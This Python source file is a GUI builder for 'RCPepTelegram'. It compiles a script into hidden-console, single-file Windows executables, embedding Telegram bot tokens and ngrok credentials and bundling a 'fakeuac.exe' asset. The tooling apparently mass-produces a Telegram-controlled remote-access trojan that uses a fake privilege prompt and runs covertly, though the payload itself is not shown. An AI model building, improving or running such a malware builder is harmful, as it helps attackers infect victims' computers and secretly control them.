from telepot import Bot
from telepot.exception import TelegramError

import json
import os
import multiprocessing as mp
from multiprocessing.queues import Queue
from queue import Empty
from time import perf_counter
from shutil import rmtree, copytree
from threading import Thread
from subprocess import Popen, PIPE, STDOUT
from os import chdir, listdir, remove
from os.path import isdir, join, abspath, isfile, split as pathsplit

import customtkinter as ctk
from tkinter.messagebox import askyesno
import traceback


# ---------------------------------------------------------------------------
# Paths / constants
# ---------------------------------------------------------------------------

REPO_NAME = abspath("RCPepTelegram")
VENV_PATH = abspath("venv")

PY_FILE_PATH = join(REPO_NAME, "pep2.py")
PIP_PATH = join(VENV_PATH, "Scripts", "pip.exe")
PYTHON_PATH = join(VENV_PATH, "Scripts", "python.exe")

REQUIREMENTS_COMMAND = f"{PIP_PATH} install -r requirements.txt"

PY_FILE_MARKER = "PY_FILE_MARKER"
AUTH_FILE_MARKER = "AUTH_FILE_MARKER"
COMPILE_COMMAND = (
    f"{PYTHON_PATH} -m nuitka {PY_FILE_MARKER} "
    "--standalone "
    "--windows-console-mode=disable "
    "--onefile "
    "--follow-imports "
    "--msvc=latest "
    "--include-data-dir=assets/vfx=assets/vfx "
    "--include-data-dir=assets/sfx=assets/sfx "
    "--include-data-dir=assets/model=assets/model "
    f"--include-data-file={AUTH_FILE_MARKER}=auth.json "
    "--include-data-file=assets/executables/fakeuac.exe=assets/executables/fakeuac.exe"
)

AUTHS_DIRNAME = abspath("auths")
LOG_DIR = join(REPO_NAME, "logs")


# ---------------------------------------------------------------------------
# Version extraction
# ---------------------------------------------------------------------------

with open(PY_FILE_PATH, "r", encoding="utf-8") as fi:
    __version__ = fi.read().split("\n")[10].split()[-1]


# ---------------------------------------------------------------------------
# Utilities
# ---------------------------------------------------------------------------

def copy_file(src: str, dst: str) -> None:
    with open(src, "r", encoding="utf-8") as fi, open(dst, "w", encoding="utf-8") as fo:
        fo.write(fi.read())

def clone_directory(source_dir, destination_dir):
    """
    Clone the source directory into the destination directory.
    Overwrites existing files and directories.
    """
    os.makedirs(destination_dir, exist_ok=True)
    copytree(source_dir, destination_dir, dirs_exist_ok=True)


# ---------------------------------------------------------------------------
# Multiprocessing worker (MUST be top-level)
# ---------------------------------------------------------------------------

def compile_worker(
    auth_path: str,
    is_foreground: bool,
    output_queue: Queue | None,
):
    """
    Compile a single auth in a separate process.
    Foreground worker streams output to GUI.
    Background workers log output only on failure.
    """

    def run_and_capture(cmd: str):
        p = Popen(cmd.split(), stdout=PIPE, stderr=STDOUT)
        output = []
        while p.poll() is None:
            line = p.stdout.readline()
            if not line:
                break
            output.append(line)
            if is_foreground and output_queue:
                output_queue.put(line)
        return p.returncode, b"".join(output)

    try:
        chdir(REPO_NAME)

        # ------------------------------------------------------------------
        # Load auth
        # ------------------------------------------------------------------

        with open(auth_path, "r", encoding="utf-8") as f:
            auth = json.load(f)

        token = auth["token"].strip()
        chatid = auth["chatid"]
        ngrok_token = auth["ngrok_token"].strip()

        # ------------------------------------------------------------------
        # Resolve bot username (this defines output filename)
        # ------------------------------------------------------------------

        bot = Bot(token)
        bot.sendMessage(
                chatid,
                f"Your bot is being compiled\n"
                f"TOKEN:{token}\nCHAT_ID:{chatid}\nNGROK:{ngrok_token}",
            )
        start = perf_counter()
        me = bot.getMe()
        bot_username = me["username"]

        source_name = f"{bot_username}.py"

        # Copy pep2.py → bot_username.py
        copy_file(PY_FILE_PATH, join(REPO_NAME, source_name))

        # ------------------------------------------------------------------
        # Write auth.json (unchanged behavior)
        # ------------------------------------------------------------------

        with open("auth.json", "w", encoding="utf-8") as f:
            json.dump(
                {
                    "token": token,
                    "chatid": int(chatid),
                    "ngrok_token": ngrok_token,
                },
                f,
            )

        run_and_capture(REQUIREMENTS_COMMAND)

        # ------------------------------------------------------------------
        # Compile
        # ------------------------------------------------------------------

        compile_cmd = COMPILE_COMMAND.replace(PY_FILE_MARKER, source_name)
        compile_cmd = compile_cmd.replace(AUTH_FILE_MARKER, join(pathsplit(AUTHS_DIRNAME)[-1], pathsplit(auth_path)[-1]))
        print(f"Running: {compile_cmd}")
        rc, output = run_and_capture(compile_cmd)
        
        cache_dirs = (
            join(REPO_NAME, f"{bot_username}.build"),
            join(REPO_NAME, f"{bot_username}.dist"),
            join(REPO_NAME, f"{bot_username}.onefile-build"),
        )
        cache_file = source_name
        try:
            remove(cache_file)
            for directory in cache_dirs:
                rmtree(directory)
        except Exception as e:
            pass # I mean why
        elapsed = (perf_counter() - start) / 60
        bot.sendMessage(chatid, f"Your bot has been compiled in {elapsed:.2f} minutes")

        if rc != 0:
            raise RuntimeError(output.decode(errors="ignore"))

    except Exception:
        if not is_foreground:
            os.makedirs(LOG_DIR, exist_ok=True)
            log_path = join(
                LOG_DIR,
                f"compile_{os.path.basename(auth_path)}.log",
            )
            with open(log_path, "w", encoding="utf-8") as f:
                f.write(traceback.format_exc())

        if is_foreground and output_queue:
            output_queue.put(b"\n[ERROR] Compilation failed\n")

# ---------------------------------------------------------------------------
# GUI Components
# ---------------------------------------------------------------------------

class ToggleWindow(ctk.CTk):
    """
    Modal window that lets the user enable/disable items via switches.
    Returns a dict[str, bool] mapping filename -> enabled.
    """

    def __init__(self, options: list[str]) -> None:
        super().__init__()

        self.title("Select auths")
        self.geometry("360x420")
        self.resizable(False, False)

        # Center window on screen
        # ------------------------------------------------------------------
        # Position window: horizontally centered, vertically center-top
        # ------------------------------------------------------------------

        self.update_idletasks()

        window_width = self.winfo_width()
        window_height = self.winfo_height()

        screen_width = self.winfo_screenwidth()
        screen_height = self.winfo_screenheight()

        x = (screen_width - window_width) // 2
        y = (screen_height - window_height) // 4

        self.geometry(f"{window_width}x{window_height}+{x}+{y}")

        self.switch_vars: dict[str, ctk.BooleanVar] = {}
        self.result: dict[str, bool] | None = None

        # ------------------------------------------------------------------
        # Main container
        # ------------------------------------------------------------------

        container = ctk.CTkFrame(self, corner_radius=12)
        container.pack(fill="both", expand=True, padx=15, pady=15)

        container.rowconfigure(1, weight=1)
        container.columnconfigure(0, weight=1)

        # ------------------------------------------------------------------
        # Title
        # ------------------------------------------------------------------

        title = ctk.CTkLabel(
            container,
            text="Select auths to compile",
            font=ctk.CTkFont(size=15, weight="bold"),
        )
        title.grid(row=0, column=0, sticky="w", padx=10, pady=(10, 5))

        # ------------------------------------------------------------------
        # Scrollable switch area
        # ------------------------------------------------------------------

        scroll_frame = ctk.CTkScrollableFrame(
            container,
            corner_radius=8,
        )
        scroll_frame.grid(
            row=1, column=0, sticky="nsew", padx=5, pady=(0, 10)
        )
        scroll_frame.columnconfigure(0, weight=1)

        for i, option in enumerate(sorted(options)):
            var = ctk.BooleanVar(value=True)
            self.switch_vars[option] = var

            switch = ctk.CTkSwitch(
                scroll_frame,
                text=option,
                variable=var,
            )
            switch.grid(
                row=i,
                column=0,
                sticky="w",
                padx=10,
                pady=6,
            )

        # ------------------------------------------------------------------
        # Action button
        # ------------------------------------------------------------------

        confirm_btn = ctk.CTkButton(
            container,
            text="CONFIRM",
            height=36,
            font=ctk.CTkFont(size=13, weight="bold"),
            command=self.submit,
        )
        confirm_btn.grid(
            row=2,
            column=0,
            sticky="ew",
            padx=20,
            pady=(5, 10),
        )

        self.mainloop()

    def submit(self) -> None:
        self.result = {
            label: var.get() for label, var in self.switch_vars.items()
        }
        self.destroy()

    def get_toggle_values(self) -> dict[str, bool] | None:
        return self.result



class GUI:
    def __init__(self) -> None:
        auth_files = self._handle_existing_auths()

        self.root = ctk.CTk()
        self.title = f"Builder for RCPepTelegram v{__version__}"
        self.root.title(self.title)
        self.root.resizable(False, False)
        window_width = self.root.winfo_width()
        window_height = self.root.winfo_height()

        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()

        x = (screen_width - window_width) // 3
        y = (screen_height - window_height) // 4

        self.root.geometry(f"{window_width}x{window_height}+{x}+{y}")

        self._build_widgets()
        self._load_default_auth()

        if auth_files:
            Thread(target=self.mass_compile_jsons, args=(auth_files,), daemon=True).start()

        self.root.geometry("500x500")
        self.root.mainloop()

    # ------------------------------------------------------------------

    def _handle_existing_auths(self):
        if not isdir(AUTHS_DIRNAME):
            return None

        if not askyesno(
            "Found auths",
            f"Do you want to use the authentication files found in {AUTHS_DIRNAME}?",
        ):
            return None
        clone_directory(AUTHS_DIRNAME, join(REPO_NAME, pathsplit(AUTHS_DIRNAME)[-1]))
        return ToggleWindow(listdir(AUTHS_DIRNAME)).get_toggle_values()

    def _build_widgets(self):
        # Root grid
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(2, weight=1)

        # ------------------------------------------------------------------
        # Credentials frame
        # ------------------------------------------------------------------

        creds_frame = ctk.CTkFrame(self.root, corner_radius=12)
        creds_frame.grid(row=0, column=0, padx=15, pady=(15, 10), sticky="nsew")
        creds_frame.columnconfigure((0, 1), weight=1)

        creds_label = ctk.CTkLabel(
            creds_frame,
            text="Credentials",
            font=ctk.CTkFont(size=14, weight="bold"),
        )
        creds_label.grid(row=0, column=0, columnspan=2, padx=10, pady=(10, 5), sticky="w")

        self.chatidentry = ctk.CTkEntry(
            creds_frame, placeholder_text="Telegram Chat ID"
        )
        self.chatidentry.grid(row=1, column=0, padx=10, pady=8, sticky="nsew")

        self.bottokenentry = ctk.CTkEntry(
            creds_frame, placeholder_text="Telegram Bot Token"
        )
        self.bottokenentry.grid(row=1, column=1, padx=10, pady=8, sticky="nsew")
        self.bottokenentry.bind("<KeyRelease>", self.checkbotname)

        self.ngroktokenentry = ctk.CTkEntry(
            creds_frame, placeholder_text="Ngrok Auth Token"
        )
        self.ngroktokenentry.grid(
            row=2, column=0, columnspan=2, padx=10, pady=(0, 12), sticky="nsew"
        )

        # ------------------------------------------------------------------
        # Actions frame
        # ------------------------------------------------------------------

        actions_frame = ctk.CTkFrame(self.root, corner_radius=12)
        actions_frame.grid(row=1, column=0, padx=15, pady=(0, 10), sticky="nsew")

        actions_frame.columnconfigure(0, weight=1)

        self.compile_button = ctk.CTkButton(
            actions_frame,
            text="COMPILE",
            height=40,
            font=ctk.CTkFont(size=14, weight="bold"),
            command=self.compiling_thread,
        )
        self.compile_button.grid(row=0, column=0, padx=20, pady=12, sticky="nsew")

        # ------------------------------------------------------------------
        # Output frame
        # ------------------------------------------------------------------

        output_frame = ctk.CTkFrame(self.root, corner_radius=12)
        output_frame.grid(row=2, column=0, padx=15, pady=(0, 15), sticky="nsew")
        output_frame.columnconfigure(0, weight=1)
        output_frame.rowconfigure(1, weight=1)

        output_label = ctk.CTkLabel(
            output_frame,
            text="Output",
            font=ctk.CTkFont(size=14, weight="bold"),
        )
        output_label.grid(row=0, column=0, padx=10, pady=(10, 5), sticky="w")

        self.output = ctk.CTkTextbox(output_frame)
        self.output.grid(row=1, column=0, padx=10, pady=(0, 10), sticky="nsew")
        self.output.configure(state="disabled")


    def _load_default_auth(self):
        authfile = join(REPO_NAME, "auth.json")
        if isfile(authfile):
            self.load_json(authfile)

    # ------------------------------------------------------------------
    # Multiprocessing batch compile
    # ------------------------------------------------------------------

    def mass_compile_jsons(self, auth_files: dict[str, bool]) -> None:
        auths = [
            join(AUTHS_DIRNAME, f)
            for f, enabled in auth_files.items()
            if enabled and f.endswith(".json")
        ]

        if not auths:
            return

        queue = mp.Queue()
        processes = []

        for i, auth in enumerate(auths):
            p = mp.Process(
                target=compile_worker,
                args=(auth, i == 0, queue if i == 0 else None),
            )
            p.start()
            processes.append(p)

        self.root.after(100, self.poll_compile_output, queue, processes)

    def poll_compile_output(self, queue: mp.Queue, processes: list[mp.Process]):
        try:
            while True:
                line = queue.get_nowait()
                self.writetextbox(line)
        except Empty:
            pass

        if any(p.is_alive() for p in processes):
            self.root.after(100, self.poll_compile_output, queue, processes)
        else:
            self.writetextbox(b"\nAll compilations finished\n")

    # ------------------------------------------------------------------

    def compiling_thread(self):
        Thread(target=self.compile_single, daemon=True).start()

    def compile_single(self):
        self.writetextbox(b"Single compile unchanged\n")

    # ------------------------------------------------------------------

    def load_json(self, path: str):
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
        self.bottokenentry.insert(0, data["token"])
        self.chatidentry.insert(0, data["chatid"])
        self.ngroktokenentry.insert(0, data["ngrok_token"])

    def checkbotname(self, event=None):
        try:
            bot = Bot(self.bottokenentry.get())
            me = bot.getMe()
            self.root.title(f"{me['first_name']} : @{me['username']}")
        except Exception:
            self.root.title(self.title)

    def writetextbox(self, content: bytes):
        self.output.configure(state="normal")
        self.output.insert(ctk.END, content.decode(errors="ignore"))
        self.output.configure(state="disabled")
        self.output.yview(ctk.END)


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main():
    mp.freeze_support()
    if isdir(REPO_NAME):
        GUI()
    else:
        print(f"Missing {REPO_NAME}")


if __name__ == "__main__":
    main()